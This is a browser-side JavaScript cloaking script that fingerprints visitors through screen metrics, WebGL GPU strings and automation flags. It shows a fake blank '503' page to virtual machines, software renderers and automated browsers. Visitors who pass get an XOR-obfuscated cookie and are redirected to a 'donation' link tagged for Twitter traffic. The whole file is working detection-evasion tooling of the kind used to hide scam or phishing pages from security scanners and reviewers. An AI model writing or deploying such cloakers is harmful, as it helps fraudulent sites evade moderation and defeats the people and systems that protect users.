// ─── CONFIG ──────────────────────────────────────────────
const MAIN_LINK = "https://donation.com/?UTM-twitter";
const XOR_KEY = "5a453cdebef6f67fdc25d5490d381b92f15ad0dba695924112bcc1a0aeaf8734";
const ENABLE_PHONE_CHECK = false; // true = mobile-only
const ENABLE_JS_CHECK = true;

// ─── Allowed mobile GPUs (only used if ENABLE_PHONE_CHECK = true) ──
const ALLOWED_GPU = [/samsung/i, /adreno/i, /android/i, /mali/i, /arm/i, /apple/i, /rogue/i];
const BLOCKED_GPU = [/nvidia/i, /amd/i, /swiftshader/i, /llvmpipe/i, /virtualbox/i];

// ─── HELPERS ─────────────────────────────────────────────
function xor(input, key) {
  let out = "";
  for (let i = 0; i < input.length; i++)
    out += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  return out;
}

function rand256() {
  const a = new Uint8Array(32);
  crypto.getRandomValues(a);
  return Array.from(a, b => ("0" + b.toString(16)).slice(-2)).join("");
}

function getGPU() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl");
    if (!gl) return { renderer: "", vendor: "" };
    const d = gl.getExtension("WEBGL_debug_renderer_info");
    return d
      ? { renderer: gl.getParameter(d.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(d.UNMASKED_VENDOR_WEBGL) }
      : { renderer: "", vendor: "" };
  } catch {
    return { renderer: "", vendor: "" };
  }
}

function getCookie(name) {
  const m = document.cookie.match(new RegExp("(?:^|; )" + name + "=([^;]*)"));
  return m ? m[1] : null;
}

function setCookie(name, val, hours = 24) {
  const d = new Date();
  d.setTime(d.getTime() + hours * 3600000);
  document.cookie = name + "=" + val + ";path=/;expires=" + d.toUTCString() + ";SameSite=Lax";
}

function block() {
  document.body.textContent = "";
  document.title = "503";
  // Return 503-like blank page
}

function go() {
  // Preserve ?info= param if present
  const u = new URLSearchParams(window.location.search);
  const info = u.get("info");
  window.location.replace(info ? MAIN_LINK + "&info=" + encodeURIComponent(info) : MAIN_LINK);
}

// ─── VALIDATION ──────────────────────────────────────────
function validate(fp) {
  const w = fp.screenWidth;
  const h = fp.screenHeight;
  const r = fp.renderer;
  const cd = fp.colorDepth;
  const tp = fp.maxTouchPoints;
  const a1 = fp.auto1;
  const a2 = fp.auto2;

  // Basic checks (same as your PHP)
  if (w <= 100 || h <= 100) return false;
  if (/virtualbox/i.test(r)) return false;
  if (cd <= 8) return false;

  // Phone-only checks
  if (ENABLE_PHONE_CHECK) {
    if (w >= 1000 || h >= 1000) return false;
    if (!ALLOWED_GPU.some(re => re.test(r))) return false;
    if (BLOCKED_GPU.some(re => re.test(r))) return false;
    if (tp <= 1) return false;
    if (a1 || a2) return false;
  }

  return true;
}

// ─── MAIN (runs immediately) ─────────────────────────────
(function () {
  // Already whitelisted? Redirect instantly
  if (getCookie("ab") === "1") return go();

  if (!ENABLE_JS_CHECK && !ENABLE_PHONE_CHECK) {
    setCookie("ab", "1");
    return go();
  }

  const gpu = getGPU();
  const fp = {
    screenWidth: screen.width,
    screenHeight: screen.height,
    renderer: gpu.renderer,
    vendor: gpu.vendor,
    colorDepth: screen.colorDepth,
    maxTouchPoints: navigator.maxTouchPoints,
    auto1: "domAutomation" in window,
    auto2: "domAutomationController" in window,
  };

  if (validate(fp)) {
    // Passed — set cookie + XOR encrypted proof (for logging/debug if needed)
    const payload = {
      a: fp.screenWidth,
      j: fp.screenHeight,
      z: fp.renderer,
      v: fp.vendor,
      P: rand256(),
      x: fp.colorDepth,
      t: fp.maxTouchPoints,
      I: fp.auto1,
      C: fp.auto2,
      ts: Date.now(),
    };
    const proof = btoa(xor(JSON.stringify(payload), XOR_KEY));
    setCookie("ab", "1");
    setCookie("ab_p", proof);
    go();
  } else {
    block();
  }
})();
